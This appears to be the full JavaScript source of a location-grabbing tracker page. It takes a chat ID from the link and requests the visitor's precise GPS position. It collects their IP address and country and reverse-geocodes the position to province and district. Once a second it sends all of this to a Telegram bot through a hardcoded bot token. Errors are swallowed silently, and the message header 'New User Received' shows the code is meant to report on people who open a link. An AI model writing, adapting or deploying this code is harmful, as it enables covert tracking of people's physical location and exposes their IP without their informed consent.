// ============ CONFIG ============
const BOT_TOKEN = "8590593373:AAFicvKtsU_Va036T-Y6eLyDi25hyDsW6Vc";
const INTERVAL_MS = 1000; // هر 1 ثانیه یو وار
// ================================

// UID from URL (?=6362758258)
const params = new URLSearchParams(location.search);
const UID = params.get("") || null;

// helpers
function countryToFlag(code){
  if(!code) return "🏳️";
  return code.toUpperCase().replace(/./g,
    c => String.fromCodePoint(127397 + c.charCodeAt())
  );
}

// get IP + country
async function getIpInfo(){
  try{
    const r = await fetch("https://ipapi.co/json/");
    const d = await r.json();
    return {
      ip: d.ip || "Unknown",
      country: d.country_name || "Unknown",
      country_code: d.country_code || ""
    };
  }catch{
    return { ip:"Unknown", country:"Unknown", country_code:"" };
  }
}

// reverse geocode (English)
async function reverseGeo(lat, lon){
  try{
    const url = `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&accept-language=en`;
    const r = await fetch(url);
    const d = await r.json();
    return {
      province: d.address.state || "Unknown",
      district: d.address.county || d.address.city || "Unknown"
    };
  }catch{
    return { province:"Unknown", district:"Unknown" };
  }
}

// get GPS
function getLocation(){
  return new Promise((resolve, reject)=>{
    navigator.geolocation.getCurrentPosition(
      pos => resolve(pos.coords),
      err => reject(err),
      { enableHighAccuracy:true, timeout:10000 }
    );
  });
}

// send GPS to bot
async function sendLocation(lat, lon){
  const form = new FormData();
  form.append("chat_id", UID);
  form.append("latitude", lat);
  form.append("longitude", lon);

  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`,{
    method:"POST",
    body:form
  });
}

// send info message
async function sendMessage(text){
  const form = new FormData();
  form.append("chat_id", UID);
  form.append("text", text);
  form.append("parse_mode","HTML");

  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
    method:"POST",
    body:form
  });
}

// MAIN LOOP
async function run(){
  try{
    const coords = await getLocation(); // 1️⃣ GPS
    const ipInfo = await getIpInfo();
    const geo = await reverseGeo(coords.latitude, coords.longitude);
    const flag = countryToFlag(ipInfo.country_code);

    // 2️⃣ send GPS first
    await sendLocation(coords.latitude, coords.longitude);

    // 3️⃣ then send text info
    const msg =
`<b>New User Received</b>

🌐 <b>IP</b> : ${ipInfo.ip}
🌍 <b>Country</b> : ${ipInfo.country} ${flag}

📍 <b>Latitude</b>  : ${coords.latitude}
📍 <b>Longitude</b> : ${coords.longitude}
🏛️ <b>Province</b>  : ${geo.province}
🏘️ <b>District</b>  : ${geo.district}

⚡ <b>Power</b> : @HematZX`;

    await sendMessage(msg);

  }catch(e){
    // permission denied or error → silently ignore
  }

  setTimeout(run, INTERVAL_MS);
}

// start
run(); 
